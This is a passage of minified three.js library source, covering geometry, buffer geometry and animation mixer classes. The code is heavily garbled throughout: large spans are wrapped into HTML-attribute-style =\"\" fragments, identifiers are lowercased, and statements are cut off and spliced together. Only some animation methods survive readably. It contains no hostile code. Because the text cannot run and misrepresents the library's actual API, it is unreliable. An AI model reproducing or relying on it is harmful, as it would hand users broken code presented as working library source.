three.matrix4);a.maketranslation(b,c,d);this.applymatrix(a);return=\"\" this}}(),scale:function(){var=\"\" function(b,c,d){void=\"\" three.matrix4);a.makescale(b,c,d);this.applymatrix(a);return=\"\" this}}(),lookat:function(){var=\"\" three.object3d);a.lookat(b);a.updatematrix();this.applymatrix(a.matrix)}}(),frombuffergeometry:function(a){function=\"\" b(a,b,d,e){var=\"\" c.colors[b].clone(),c.colors[d].clone()]:[];e=\"new\" three.face3(a,b,d,f,q,e);c.faces.push(e);void=\"\" 0,e=\"a.attributes,f=e.position.array,g=void\" 0,h=\"void\" 0,k=\"void\" 0,l=\"void\" 0;void=\"\" []);for(var=\"\" n=\"[],p=[],m=[],q=e=0;e<f.length;e+=3,q+=2)c.vertices.push(new\" three.vector3(f[e],f[e+1],f[e+2])),void=\"\" three.vector3(g[e],g[e+1],g[e+2])),void=\"\" three.color(h[e],h[e+1],h[e+2])),void=\"\" three.vector2(k[q],k[q+1])),void=\"\" three.vector2(l[q],l[q+1]));if(void=\"\" r=\"f[e],s=r.start,t=r.count,q=s,s=s+t;q<s;q+=3)b(d[q],d[q+1],d[q+2],r.materialIndex);else\" for(e=\"0;e<\" d.length;e+=\"3)b(d[e],d[e+1],d[e+2]);else\" this},center:function(){this.computeboundingbox();var=\"\" a},normalize:function(){this.computeboundingsphere();var=\"\" b,c=\"new\" three.matrix4;c.set(b,0,0,-b*a.x,0,b,0,-b*a.y,0,0,b,-b*a.z,0,0,0,1);this.applymatrix(c);return=\"\" this},computefacenormals:function(){for(var=\"\" three.vector3,c=\"0,d=this.faces.length;c<d;c++){var\" b,c,d;d=\"Array(this.vertices.length);b=0;for(c=this.vertices.length;b<\" c;b++)d[b]=\"new\" three.vector3;if(a){var=\"\" e,f,g,h=\"new\" three.vector3,k=\"new\" three.vector3;a=\"0;for(b=this.faces.length;a<b;a++)c=this.faces[a],e=this.vertices[c.a],f=this.vertices[c.b],g=this.vertices[c.c],h.subVectors(g,f),k.subVectors(e,f),h.cross(k),d[c.a].add(h),d[c.b].add(h),d[c.c].add(h)}else\" for(a=\"0,b=this.faces.length;a<b;a++)c=this.faces[a],d[c.a].add(c.normal),d[c.b].add(c.normal),d[c.c].add(c.normal);b=0;for(c=this.vertices.length;b<c;b++)d[b].normalize();a=0;for(b=this.faces.length;a<b;a++)c=\" this.faces[a],e=\"c.vertexNormals,3===e.length?(e[0].copy(d[c.a]),e[1].copy(d[c.b]),e[2].copy(d[c.c])):(e[0]=d[c.a].clone(),e[1]=d[c.b].clone(),e[2]=d[c.c].clone());0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){var\" a,b,c,d,e;c=\"0;for(d=this.faces.length;c<d;c++)for(e=this.faces[c],e.__originalFaceNormal?e.__originalFaceNormal.copy(e.normal):e.__originalFaceNormal=e.normal.clone(),e.__originalVertexNormals||(e.__originalVertexNormals=[]),a=0,b=e.vertexNormals.length;a<\" b;a++)e.__originalvertexnormals[a]?e.__originalvertexnormals[a].copy(e.vertexnormals[a]):e.__originalvertexnormals[a]=\"e.vertexNormals[a].clone();var\" three.geometry;f.faces=\"this.faces;a=0;for(b=this.morphTargets.length;a<b;a++){if(!this.morphNormals[a]){this.morphNormals[a]={};this.morphNormals[a].faceNormals=[];this.morphNormals[a].vertexNormals=[];e=this.morphNormals[a].faceNormals;var\" three.vector3,=\"\" b:new=\"\" three.vector3,c:new=\"\" three.vector3},e.push(h),g.push(k)}g=\"this.morphNormals[a];f.vertices=this.morphTargets[a].vertices;f.computeFaceNormals();f.computeVertexNormals();c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],h=g.faceNormals[c],k=g.vertexNormals[c],h.copy(e.normal),k.a.copy(e.vertexNormals[0]),k.b.copy(e.vertexNormals[1]),k.c.copy(e.vertexNormals[2])}c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],e.normal=e.__originalFaceNormal,e.vertexNormals=e.__originalVertexNormals},computeTangents:function(){console.warn(\" three.geometry:\"=\"\" .computetangents()=\"\" removed.\")},=\"\" computelinedistances:function(){for(var=\"\" three.box3);this.boundingbox.setfrompoints(this.vertices)},computeboundingsphere:function(){null=\"==this.boundingSphere&&(this.boundingSphere=new\" three.sphere);this.boundingsphere.setfrompoints(this.vertices)},merge:function(a,b,c){if(!1=\"==a\" three.geometry)console.error(\"three.geometry.merge():=\"\" geometry=\"\" three.geometry.\",=\"\" a);else{var=\"\" d,e=\"this.vertices.length,f=this.vertices,g=a.vertices,h=this.faces,k=a.faces,l=this.faceVertexUvs[0];a=a.faceVertexUvs[0];void\" three.matrix3).getnormalmatrix(b));for(var=\"\" m=\"g[n].clone();void\" three.face3(g.a+e,g.b+e,g.c+e);m.normal.copy(g.normal);void=\"\" f;b++)q=\"r[b].clone(),void\" three.mesh?console.error(\"three.geometry.mergemesh():=\"\" mesh=\"\" three.mesh.\",a):(a.matrixautoupdate&&a.updatematrix(),=\"\" this.merge(a.geometry,a.matrix))},mergevertices:function(){var=\"\">d;d++)if(e[d]===e[(d+1)%3]){a.push(f);break}for(f=a.length-1;0<=f;f--)for(e=a[f],this.faces.splice(e, 0=\"==this.faceVertexUvs[c]&&(this.faceVertexUvs[c]=[]);for(var\" 1),c=\"0,g=this.faceVertexUvs.length;c<g;c++)this.faceVertexUvs[c].splice(e,1);f=this.vertices.length-b.length;this.vertices=b;return\" f},sortfacesbymaterialindex:function(){for(var=\"\" a=\"this.faces,b=a.length,c=0;c<b;c++)a[c]._id=c;a.sort(function(a,b){return\" a.materialindex-b.materialindex});var=\"\" d=\"this.faceVertexUvs[0],e=this.faceVertexUvs[1],f,g;d&&d.length===b&&(f=[]);e&&e.length===b&&(g=[]);for(c=0;c<b;c++){var\" h=\"a[c]._id;f&&f.push(d[h]);g&&g.push(e[h])}f&&(this.faceVertexUvs[0]=f);g&&(this.faceVertexUvs[1]=\" g)},tojson:function(){function=\"\" a(a,b,c){return=\"\" c?a|1<<b:a&~(1<<b)}function=\"\" b(a){var=\"\" b=\"a.x.toString()+a.y.toString()+a.z.toString();if(void\" 0!=\"=l[b])return\" l[b];l[b]=\"k.length/3;k.push(a.x,a.y,a.z);return\" l[b]}function=\"\" c(a){var=\"\" p[b];p[b]=\"n.length;n.push(a.getHex());return\" p[b]}function=\"\" d(a){var=\"\" q[b];q[b]=\"m.length/2;m.push(a.x,a.y);return\" q[b]}var=\"\" e=\"{metadata:{version:4.4,type:\" geometry\",\"=\"\" generator:\"geometry.tojson\"}};e.uuid=\"this.uuid;e.type=this.type;\" \"!=\"=this.name&&(e.name=this.name);if(void\"\" f=\"this.parameters,g;for(g\" in=\"\" f)void=\"\" e}f=\"[];for(g=0;g<this.vertices.length;g++){var\" r=\"this.faces[g],s=void\" c=\"0<r.vertexColors.length,w=0,w=a(w,0,0),w=a(w,1,!0),w=a(w,2,!1),w=a(w,3,s),w=a(w,4,t),w=a(w,5,u),w=a(w,6,v),w=a(w,7,C);h.push(w);h.push(r.a,r.b,r.c);h.push(r.materialIndex);s&&(s=this.faceVertexUvs[0][g],h.push(d(s[0]),d(s[1]),d(s[2])));t&&h.push(b(r.normal));u&&(t=r.vertexNormals,h.push(b(t[0]),b(t[1]),b(t[2])));v&&h.push(c(r.color));C&&(r=r.vertexColors,h.push(c(r[0]),c(r[1]),c(r[2])))}e.data={};e.data.vertices=f;e.data.normals=k;0<n.length&&(e.data.colors=n);0<m.length&&(e.data.uvs=[m]);e.data.faces=\" h;return=\"\" e},clone:function(){return(new=\"\" three.geometry).copy(this)},copy:function(a){this.vertices=\"[];this.faces=[];this.faceVertexUvs=[[]];for(var\" g=\"b[e],h=[],k=0,l=g.length;k<l;k++)h.push(g[k].clone());\" this.facevertexuvs[c].push(h)}}return=\"\" this},dispose:function(){this.dispatchevent({type:\"dispose\"})}});three.geometryidcount=\"0;\" three.directgeometry=\"function(){Object.defineProperty(this,\" id\",{value:three.geometryidcount++});this.uuid=\"THREE.Math.generateUUID();this.name=\"\";this.type=\"DirectGeometry\";this.indices=[];this.vertices=[];this.normals=[];this.colors=[];this.uvs=[];this.uvs2=[];this.groups=[];this.morphTargets={};this.skinWeights=[];this.skinIndices=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.uvsNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.verticesNeedUpdate=!1};\"\" object.assign(three.directgeometry.prototype,three.eventdispatcher.prototype,{computeboundingbox:three.geometry.prototype.computeboundingbox,computeboundingsphere:three.geometry.prototype.computeboundingsphere,computefacenormals:function(){console.warn(\"three.directgeometry:=\"\" computefacenormals()=\"\" is=\"\" not=\"\" method=\"\" of=\"\" this=\"\" type=\"\" geometry.\")},computevertexnormals:function(){console.warn(\"three.directgeometry:=\"\" computevertexnormals()=\"\" geometry.\")},computegroups:function(a){var=\"\" b,=\"\" l=\"0;l<h;l++)k[l]=[];this.morphTargets.position=k}var\" n=\"a.morphNormals,p=n.length,m;if(0<p){m=[];for(l=0;l<\" p;l++)m[l]=\"[];this.morphTargets.normal=m}for(var\" q=\"a.skinIndices,r=a.skinWeights,s=q.length===c.length,t=r.length===c.length,l=0;l<b.length;l++){var\" u=\"b[l];this.vertices.push(c[u.a],c[u.b],c[u.c]);var\" v=\"u.vertexNormals;3===v.length?this.normals.push(v[0],v[1],v[2]):(v=u.normal,this.normals.push(v,v,v));v=u.vertexColors;3===v.length?this.colors.push(v[0],v[1],v[2]):(v=u.color,this.colors.push(v,v,v));!0===e&&(v=d[0][l],void\" undefined=\"\" vertexuv=\"\" \",=\"\" l),this.uvs.push(new=\"\" three.vector2,new=\"\" three.vector2)));!0=\"==f&&(v=d[1][l],void\" vertexuv2=\"\" \",l),this.uvs2.push(new=\"\" three.vector2)));for(v=\"0;v<h;v++){var\" r[u.c])}this.computegroups(a);this.verticesneedupdate=\"a.verticesNeedUpdate;this.normalsNeedUpdate=a.normalsNeedUpdate;this.colorsNeedUpdate=a.colorsNeedUpdate;this.uvsNeedUpdate=a.uvsNeedUpdate;this.groupsNeedUpdate=a.groupsNeedUpdate;return\" this},dispose:function(){this.dispatchevent({type:\"dispose\"})}});=\"\" three.buffergeometry=\"function(){Object.defineProperty(this,\" object.assign(three.buffergeometry.prototype,three.eventdispatcher.prototype,{getindex:function(){return=\"\" this.index},setindex:function(a){this.index=\"a},addAttribute:function(a,b,c){if(!1===b\" instanceof=\"\" three.bufferattribute&&!1=\"==b\" three.interleavedbufferattribute)console.warn(\"three.buffergeometry:=\"\" .addattribute()=\"\" now=\"\" expects=\"\" (=\"\" name,=\"\" attribute=\"\" ).\"),this.addattribute(a,new=\"\" three.bufferattribute(b,c));else=\"\" if(\"index\"=\"==a)console.warn(\" three.buffergeometry.addattribute:\"=\"\" use=\"\" .setindex()=\"\" for=\"\" index=\"\" attribute.\"),=\"\" this.setindex(b);else=\"\" return=\"\" this.attributes[a]=\"b,this},getAttribute:function(a){return\" this.attributes[a]},removeattribute:function(a){delete=\"\" this.attributes[a];return=\"\" this},addgroup:function(a,b,c){this.groups.push({start:a,count:b,materialindex:void=\"\" void=\"\" three.matrix3).getnormalmatrix(a).applytovector3array(b.array),b.needsupdate=\"!0);null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();return\" this},rotatex:function(){var=\"\" a;return=\"\" function(b){void=\"\" three.matrix4);a.makerotationx(b);this.applymatrix(a);return=\"\" this}}(),rotatey:function(){var=\"\" three.matrix4);a.makerotationy(b);this.applymatrix(a);return=\"\" this}}(),rotatez:function(){var=\"\" a;=\"\" three.matrix4);a.makerotationz(b);this.applymatrix(a);return=\"\" this}}(),translate:function(){var=\"\" function(b,c,d){void=\"\" three.matrix4);a.maketranslation(b,c,d);this.applymatrix(a);return=\"\" this}}(),scale:function(){var=\"\" three.matrix4);a.makescale(b,c,d);this.applymatrix(a);return=\"\" this}}(),lookat:function(){var=\"\" three.object3d);a.lookat(b);a.updatematrix();this.applymatrix(a.matrix)}}(),=\"\" center:function(){this.computeboundingbox();var=\"\" a},setfromobject:function(a){var=\"\" three.points||a=\"\" three.line){a=\"new\" three.float32attribute(3*b.vertices.length,3);var=\"\" three.float32attribute(3*b.colors.length,3);this.addattribute(\"position\",a.copyvector3sarray(b.vertices));this.addattribute(\"color\",c.copycolorsarray(b.colors));b.linedistances&&b.linedistances.length=\"==b.vertices.length&&\" (a=\"new\" three.float32attribute(b.linedistances.length,1),this.addattribute(\"linedistance\",a.copyarray(b.linedistances)));null!=\"=b.boundingSphere&&(this.boundingSphere=b.boundingSphere.clone());null!==b.boundingBox&&(this.boundingBox=b.boundingBox.clone())}else\" three.mesh&&b=\"\" three.geometry&&this.fromgeometry(b);return=\"\" this},updatefromobject:function(a){var=\"\" three.mesh){var=\"\" this.fromgeometry(b);c.verticesneedupdate=\"b.verticesNeedUpdate;c.normalsNeedUpdate=b.normalsNeedUpdate;c.colorsNeedUpdate=b.colorsNeedUpdate;c.uvsNeedUpdate=b.uvsNeedUpdate;c.groupsNeedUpdate=b.groupsNeedUpdate;b.verticesNeedUpdate=!1;b.normalsNeedUpdate=!1;b.colorsNeedUpdate=!1;b.uvsNeedUpdate=!1;b.groupsNeedUpdate=!1;b=c}!0===b.verticesNeedUpdate&&(c=this.attributes.position,void\" c.needsupdate=\"!0),b.normalsNeedUpdate=!1);!0===b.colorsNeedUpdate&&(c=this.attributes.color,void\" b.groups,b.groupsneedupdate=\"!1);return\" this},fromgeometry:function(a){a.__directgeometry=\"(new\" three.directgeometry).fromgeometry(a);return=\"\" this.fromdirectgeometry(a.__directgeometry)},fromdirectgeometry:function(a){var=\"\" float32array(3*a.vertices.length);this.addattribute(\"position\",(new=\"\" three.bufferattribute(b,3)).copyvector3sarray(a.vertices));0<a.normals.length&&(b=\"new\" float32array(3*a.normals.length),this.addattribute(\"normal\",(new=\"\" three.bufferattribute(b,3)).copyvector3sarray(a.normals)));=\"\" 0<a.colors.length&&(b=\"new\" float32array(3*a.colors.length),this.addattribute(\"color\",(new=\"\" three.bufferattribute(b,3)).copycolorsarray(a.colors)));0<a.uvs.length&&(b=\"new\" float32array(2*a.uvs.length),this.addattribute(\"uv\",(new=\"\" three.bufferattribute(b,2)).copyvector2sarray(a.uvs)));0<a.uvs2.length&&(b=\"new\" float32array(2*a.uvs2.length),this.addattribute(\"uv2\",(new=\"\" three.bufferattribute(b,2)).copyvector2sarray(a.uvs2)));0<a.indices.length&&(b=\"new\" (65535<a.vertices.length?uint32array:uint16array)(3*a.indices.length),=\"\" this.setindex((new=\"\" three.bufferattribute(b,1)).copyindicesarray(a.indices)));this.groups=\"a.groups;for(var\" a.morphtargets){for(var=\"\" three.float32attribute(3*g.length,3);b.push(h.copyvector3sarray(g))}this.morphattributes[c]=\"b}0<a.skinIndices.length&&(c=new\" three.float32attribute(4*a.skinindices.length,4),this.addattribute(\"skinindex\",c.copyvector4sarray(a.skinindices)));0<a.skinweights.length&&(c=\"new\" three.float32attribute(4*a.skinweights.length,=\"\" 4),this.addattribute(\"skinweight\",c.copyvector4sarray(a.skinweights)));null!=\"=a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());return\" this},computeboundingbox:function(){null=\"==this.boundingBox&&(this.boundingBox=new\" three.box3);var=\"\" console.error('three.buffergeometry.computeboundingbox:=\"\" computed=\"\" min=\"\" max=\"\" have=\"\" nan=\"\" values.=\"\" the=\"\" \"position\"=\"\" likely=\"\" to=\"\" values.',this)},computeboundingsphere:function(){var=\"\" three.box3,b=\"new\" three.vector3;return=\"\" function(){null=\"==this.boundingSphere&&(this.boundingSphere=new\" three.sphere);var=\"\" this.boundingsphere.radius=\"Math.sqrt(e);isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere():\" radius=\"\" nan.=\"\" values.',this)}}}(),computefacenormals:function(){},computevertexnormals:function(){var=\"\" three.bufferattribute(new=\"\" float32array(d.length),3));else=\"\" for(var=\"\" three.vector3,p=\"new\" three.vector3,m=\"new\" three.vector3,q=\"new\" three.vector3,r=\"new\" three.vector3;if(a){a=\"a.array;0===c.length&&this.addGroup(0,a.length);for(var\" s=\"0,t=c.length;s<t;++s)for(f=c[s],g=f.start,h=f.count,f=g,g+=h;f<g;f+=3)h=3*a[f+0],k=3*a[f+1],l=3*a[f+2],n.fromArray(d,h),p.fromArray(d,k),m.fromArray(d,l),q.subVectors(m,p),r.subVectors(n,p),q.cross(r),e[h]+=q.x,e[h+1]+=q.y,e[h+2]+=q.z,e[k]+=q.x,e[k+1]+=q.y,e[k+2]+=q.z,e[l]+=q.x,\" e[l+1]+=\"q.y,e[l+2]+=q.z}else\" for(f=\"0,g=d.length;f<g;f+=9)n.fromArray(d,f),p.fromArray(d,f+3),m.fromArray(d,f+6),q.subVectors(m,p),r.subVectors(n,p),q.cross(r),e[f]=q.x,e[f+1]=q.y,e[f+2]=q.z,e[f+3]=q.x,e[f+4]=q.y,e[f+5]=q.z,e[f+6]=q.x,e[f+7]=q.y,e[f+8]=q.z;this.normalizeNormals();b.normal.needsUpdate=!0}},merge:function(a,b){if(!1===a\" three.buffergeometry)console.error(\"three.buffergeometry.merge():=\"\" geometry=\"\" an=\"\" instance=\"\" three.buffergeometry.\",a);else{void=\"\" d;for(d=\"\" c)if(void=\"\" this}},normalizenormals:function(){for(var=\"\" console.warn(\"three.buffergeometry.tononindexed():=\"\" already=\"\" non-indexed.\"),this;var=\"\" three.buffergeometry,=\"\" c){for(var=\"\" f.constructor(b.length*e),h=\"0,k=0,l=0,n=b.length;l<n;l++)for(var\" three.bufferattribute(g,e))}return=\"\" a},tojson:function(){var=\"\" b)void=\"\" b[c]&&(a[c]=\"b[c]);return\" a}a.data=\"{attributes:{}};var\" d){var=\"\" radius:c.radius});return=\"\" a},clone:function(){return(new=\"\" three.buffergeometry).copy(this)},copy:function(a){var=\"\" b)this.addattribute(c,b[c].clone());a=\"a.groups;c=0;for(b=a.length;c<b;c++){var\" this},dispose:function(){this.dispatchevent({type:\"dispose\"})}});three.buffergeometry.maxindex=\"65535;\" three.instancedbuffergeometry=\"function(){THREE.BufferGeometry.call(this);this.type=\" instancedbuffergeometry\";this.maxinstancedcount=\"void\"\" 0};three.instancedbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.InstancedBufferGeometry.prototype.constructor=THREE.InstancedBufferGeometry;THREE.InstancedBufferGeometry.prototype.addGroup=function(a,b,c){this.groups.push({start:a,count:b,instances:c})};\" three.instancedbuffergeometry.prototype.copy=\"function(a){var\" this};three.uniform=\"function(a,b){\" string\"=\"==typeof\"\" a&&(console.warn(\"three.uniform:=\"\" parameter=\"\" no=\"\" longer=\"\" needed.\"),a=\"b);this.value=a;this.dynamic=!1};\" three.uniform.prototype=\"{constructor:THREE.Uniform,onUpdate:function(a){this.dynamic=!0;this.onUpdateCallback=a;return\" this}};three.animationaction=\"function(){throw\" error(\"three.animationaction:=\"\" mixer.clipaction=\"\" construction.\");};=\"\" three.animationaction._new=\"function(a,b,c){this._mixer=a;this._clip=b;this._localRoot=c||null;a=b.tracks;b=a.length;c=Array(b);for(var\" -1;this._starttime=\"null;this.time=0;this._effectiveWeight=this.weight=this._effectiveTimeScale=this.timeScale=1;this.repetitions=Infinity;this.paused=!1;this.enabled=!0;this.clampWhenFinished=!1;this.zeroSlopeAtEnd=this.zeroSlopeAtStart=!0};\" three.animationaction._new.prototype=\"{constructor:THREE.AnimationAction._new,play:function(){this._mixer._activateAction(this);return\" this},stop:function(){this._mixer._deactivateaction(this);return=\"\" this.reset()},reset:function(){this.paused=\"!1;this.enabled=!0;this.time=0;this._loopCount=-1;this._startTime=null;return\" this.stopfading().stopwarping()},isrunning:function(){return=\"\" this.enabled&&!this.paused&&0!=\"=this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},isScheduled:function(){return\" this._mixer._isactiveaction(this)},=\"\" startat:function(a){this._starttime=\"a;return\" this},setloop:function(a,b){this.loop=\"a;this.repetitions=b;return\" this},seteffectiveweight:function(a){this.weight=\"a;this._effectiveWeight=this.enabled?a:0;return\" this.stopfading()},geteffectiveweight:function(){return=\"\" this._effectiveweight},fadein:function(a){return=\"\" this._schedulefading(a,0,1)},fadeout:function(a){return=\"\" this._schedulefading(a,1,0)},crossfadefrom:function(a,b,c){a.fadeout(b);this.fadein(b);if(c){c=\"this._clip.duration;var\" this},crossfadeto:function(a,b,c){return=\"\" a.crossfadefrom(this,b,c)},stopfading:function(){var=\"\" this},seteffectivetimescale:function(a){this.timescale=\"a;this._effectiveTimeScale=this.paused?0:a;return\" this.stopwarping()},geteffectivetimescale:function(){return=\"\" this._effectivetimescale},setduration:function(a){this.timescale=\"this._clip.duration/\" this.stopwarping()},syncwith:function(a){this.time=\"a.time;this.timeScale=a.timeScale;return\" this.stopwarping()},halt:function(a){return=\"\" this.warp(this._effectivetimescale,0,a)},warp:function(a,b,c){var=\"\" this},stopwarping:function(){var=\"\" (this._timescaleinterpolant=\"null,this._mixer._takeBackControlInterpolant(a));return\" this},getmixer:function(){return=\"\" this._mixer},getclip:function(){return=\"\" this._clip},getroot:function(){return=\"\" this._localroot||this._mixer._root},_update:function(a,b,c,d){var=\"\">b||0===c)return;this._startTime=null;b*=c}b*=this._updateTimeScale(a);c=this._updateTime(b);a=this._updateWeight(a);if(0<a){b=this._interpolants;for(var e=\"this._propertyBindings,f=0,g=b.length;f!==\" g;++f)b[f].evaluate(c),e[f].accumulate(d,a)}},_updateweight:function(a){var=\"\" b=\"0;if(this.enabled){var\" d=\"c.evaluate(a)[0],b=b*d;a\">c.parameterPositions[1]&&(this.stopFading(),0===d&&(this.enabled=!1))}}return this._effectiveWeight=b},_updateTimeScale:function(a){var b=0;if(!this.paused){var b=this.timeScale,c=this._timeScaleInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&(this.stopWarping(),0===b?this.paused=!0:\nthis.timeScale=b)}}return this._effectiveTimeScale=b},_updateTime:function(a){var b=this.time+a;if(0===a)return b;var c=this._clip.duration,d=this.loop,e=this._loopCount;if(d===THREE.LoopOnce)a:{if(-1===e&&(this.loopCount=0,this._setEndings(!0,!0,!1)),b>=c)b=c;else if(0>b)b=0;else break a;this.clampWhenFinished?this.paused=!0:this.enabled=!1;this._mixer.dispatchEvent({type:\"finished\",action:this,direction:0>a?-1:1})}else{d=d===THREE.LoopPingPong;-1===e&&(0<=a?(e=0,this._setendings(!0,0===this.repetitions, d)):this._setendings(0=\"==this.repetitions,!0,d));if(b\">=c||0>b){var f=Math.floor(b/c),b=b-c*f,e=e+Math.abs(f),g=this.repetitions-e;0>g?(this.clampWhenFinished?this.paused=!0:this.enabled=!1,b=0<a?c:0,this._mixer.dispatchevent({type:\"finished\",action:this,direction:0<a?1:-1})):(0===g?(a=0>a,this._setEndings(a,!a,d)):this._setEndings(!1,!1,d),this._loopCount=e,this._mixer.dispatchEvent({type:\"loop\",action:this,loopDelta:f}))}if(d&&1===(e&1))return this.time=b,c-b}return this.time=b},_setEndings:function(a,\nb,c){var d=this._interpolantSettings;c?(d.endingStart=THREE.ZeroSlopeEnding,d.endingEnd=THREE.ZeroSlopeEnding):(d.endingStart=a?this.zeroSlopeAtStart?THREE.ZeroSlopeEnding:THREE.ZeroCurvatureEnding:THREE.WrapAroundEnding,d.endingEnd=b?this.zeroSlopeAtEnd?THREE.ZeroSlopeEnding:THREE.ZeroCurvatureEnding:THREE.WrapAroundEnding)},_scheduleFading:function(a,b,c){var d=this._mixer,e=d.time,f=this._weightInterpolant;null===f&&(this._weightInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;\nf=f.sampleValues;d[0]=e;f[0]=b;d[1]=e+a;f[1]=c;return this}};THREE.AnimationClip=function(a,b,c){this.name=a;this.tracks=c;this.duration=void 0!==b?b:-1;this.uuid=THREE.Math.generateUUID();0>this.duration&&this.resetDuration();this.trim();this.optimize()};\nTHREE.AnimationClip.prototype={constructor:THREE.AnimationClip,resetDuration:function(){for(var a=0,b=0,c=this.tracks.length;b!==c;++b)var d=this.tracks[b],a=Math.max(a,d.times[d.times.length-1]);this.duration=a},trim:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].trim(0,this.duration);return 0=\"==d.length?null:new\" this},optimize:function(){for(var=\"\" a=\"0;a<this.tracks.length;a++)this.tracks[a].optimize();return\" this}};=\"\" object.assign(three.animationclip,{parse:function(a){for(var=\"\" b=\"[],c=a.tracks,d=1/(a.fps||1),e=0,f=c.length;e!==f;++e)b.push(THREE.KeyframeTrack.parse(c[e]).scale(d));return\" new=\"\" three.animationclip(a.name,a.duration,b)},tojson:function(a){var=\"\" d=\"0,e=c.length;d!==e;++d)b.push(THREE.KeyframeTrack.toJSON(c[d]));return\" a},createfrommorphtargetsequence:function(a,b,c,d){for(var=\"\" e=\"b.length,f=[],g=0;g<e;g++){var\" h=\"[],k=[];h.push((g+e-1)%\" e,g,(g+1)%e);k.push(0,1,0);var=\"\" l=\"THREE.AnimationUtils.getKeyframeOrder(h),h=THREE.AnimationUtils.sortedArray(h,1,l),k=THREE.AnimationUtils.sortedArray(k,1,l);d||0!==h[0]||(h.push(e),k.push(k[0]));f.push((new\" three.numberkeyframetrack(\".morphtargetinfluences[\"+b[g].name+\"]\",h,k)).scale(1=\"\" c))}return=\"\" three.animationclip(a,-1,f)},findbyname:function(a,b){var=\"\" c=\"a;Array.isArray(a)||(c=a.geometry&&a.geometry.animations||a.animations);for(var\" c[d];return=\"\" null},=\"\" createclipsfrommorphtargetsequences:function(a,b,c){for(var=\"\" in=\"\" d)a.push(three.animationclip.createfrommorphtargetsequence(l,d[l],b,c));return=\"\" a},parseanimation:function(a,b,c){if(!a)return=\"\" console.error(\"=\"\" no=\"\" animation=\"\" jsonloader=\"\" data\"),null;c=\"function(a,b,c,d,e){if(0!==c.length){var\" f=\"[],g=[];THREE.AnimationUtils.flattenJSON(c,f,g,d);0!==f.length&&\" e.push(new=\"\" a(b,f,g))}};var=\"\" k=\"a[h].keys;if(k&&0!==k.length)if(k[0].morphTargets){for(var\" n=\"0;n<k[l].morphTargets.length;n++)f[k[l].morphTargets[n]]=-1;for(var\" p=\"\" f){for(var=\"\" m=\"[],q=[],n=0;n!==k[l].morphTargets.length;++n){var\" r=\"k[l];m.push(r.time);q.push(r.morphTarget===p?1:0)}d.push(new\" three.numberkeyframetrack(\".morphtargetinfluence[\"+p+\"]\",=\"\" m,q))}f=\"f.length*(g||1)}else\" +b[h].name+\"]\",c(three.vectorkeyframetrack,l+\".position\",k,\"pos\",d),c(three.quaternionkeyframetrack,l+\".quaternion\",k,\"rot\",d),c(three.vectorkeyframetrack,l+\".scale\",k,\"scl\",d)}return=\"\" three.animationclip(e,f,d)}});three.animationmixer=\"function(a){this._root=a;this._initMemoryManager();this.time=this._accuIndex=0;this.timeScale=1};\" object.assign(three.animationmixer.prototype,three.eventdispatcher.prototype,{clipaction:function(a,b){var=\"\" a?three.animationclip.findbyname(c,a):a,c=\"null!==e?e.uuid:a,f=this._actionsByClip[c],g=null;if(void\" 0!=\"=f){g=f.actionByRoot[d];if(void\" g;g=\"f.knownActions[0];null===e&&(e=g._clip)}if(null===e)return\" null;e=\"new\" three.animationmixer._action(this,e,b);this._bindaction(e,g);this._addinactiveaction(e,c,d);return=\"\" e},existingaction:function(a,=\"\" b){var=\"\" void=\"\" this},update:function(a){a*=\"this.timeScale;for(var\" a,e=\"Math.sign(a),f=this._accuIndex^=1,g=0;g!==c;++g){var\" this},getroot:function(){return=\"\" this._root},uncacheclip:function(a){var=\"\" g=\"d[e];this._deactivateAction(g);var\" h;b[h]=\"k;b.pop();this._removeInactiveBindingsForAction(g)}delete\" c[a]}},uncacheroot:function(a){a=\"a.uuid;var\" c)a=\"c[e],a.restoreOriginalState(),this._removeInactiveBinding(a)},uncacheAction:function(a,b){var\" three.animationmixer._action=\"THREE.AnimationAction._new;\" object.assign(three.animationmixer.prototype,{_bindaction:function(a,b){var=\"\" three.propertymixer(three.propertybinding.create(c,p,b&&b._propertybindings[k].binding.parsedpath),=\"\" n.valuetypename,n.getvaluesize());++m.referencecount;this._addinactivebinding(m,h,p)}f[k]=\"m;g[k].resultBuffer=m.buffer}},_activateAction:function(a){if(!this._isActiveAction(a)){if(null===a._cacheIndex){var\" _deactivateaction:function(a){if(this._isactiveaction(a)){for(var=\"\" total(){return=\"\" a._actions.length},=\"\" get=\"\" inuse(){return=\"\" a._nactiveactions}},bindings:{get=\"\" a._bindings.length},get=\"\" a._nactivebindings}},controlinterpolants:{get=\"\" a._controlinterpolants.length},get=\"\" a._nactivecontrolinterpolants}}}},_isactiveaction:function(a){a=\"a._cacheIndex;return\" null!=\"=a&&a<this._nActiveActions},_addInactiveAction:function(a,b,c){var\" f.knownactions,a._byclipcacheindex=\"b.length,b.push(a));a._cacheIndex=d.length;d.push(a);f.actionByRoot[c]=a},_removeInactiveAction:function(a){var\" e.actionbyroot[(b._localroot||this._root).uuid];0=\"==f.length&&delete\" d[c];this._removeinactivebindingsforaction(a)},=\"\" _removeinactivebindingsforaction:function(a){a=\"a._propertyBindings;for(var\" f[c];a:{for(var=\"\" f)break=\"\" a;delete=\"\" e[d]}},_lendbinding:function(a){var=\"\" three.linearinterpolant(new=\"\" float32array(2),new=\"\" float32array(2),1,this._controlinterpolantsresultbuffer),c.__cacheindex=\"b,a[b]=c);return\" c},_takebackcontrolinterpolant:function(a){var=\"\" float32array(1)});=\"\" three.animationobjectgroup=\"function(a){this.uuid=THREE.Math.generateUUID();this._objects=Array.prototype.slice.call(arguments);this.nCachedObjects_=0;var\" e._objects.length},get=\"\" this.total-e.ncachedobjects_}},get=\"\" 